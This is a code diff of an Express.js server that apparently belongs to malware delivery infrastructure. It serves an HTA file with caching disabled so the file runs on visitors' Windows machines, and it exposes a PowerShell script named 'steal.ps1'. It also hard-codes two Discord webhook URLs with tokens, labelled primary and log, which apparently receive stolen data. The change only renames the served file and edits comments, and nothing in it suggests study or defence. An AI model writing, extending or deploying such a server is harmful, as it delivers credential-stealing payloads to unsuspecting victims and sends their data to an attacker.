@@ -7,22 +7,22 @@ const app = express();
 app.set("trust proxy", 1);
 app.use(express.json({ limit: "2mb" }));
 
-// 1. Serve the HTA (force download/execute, no caching)
+// 1. Serve the HTA (looks for file.hta now)
 app.get("/", (req, res) => {
   res.setHeader("Content-Type", "application/hta");
   res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
   res.setHeader("Pragma", "no-cache");
   res.setHeader("Expires", "0");
-  res.sendFile(path.join(__dirname, "index.hta"));
+  res.sendFile(path.join(__dirname, "file.hta"));
 });
 
-// 2. Serve any PowerShell scripts if you ever need them
+// 2. Serve any PowerShell scripts (remove this if you don't have steal.ps1)
 app.get("/steal.ps1", (req, res) => {
   res.setHeader("Content-Type", "text/plain");
   res.sendFile(path.join(__dirname, "steal.ps1"));
 });
 
-// 3. Webhook endpoint (if you ever want to fetch them dynamically)
+// 3. Webhooks
 const WEBHOOK_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu";
 const WEBHOOK_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn";
 
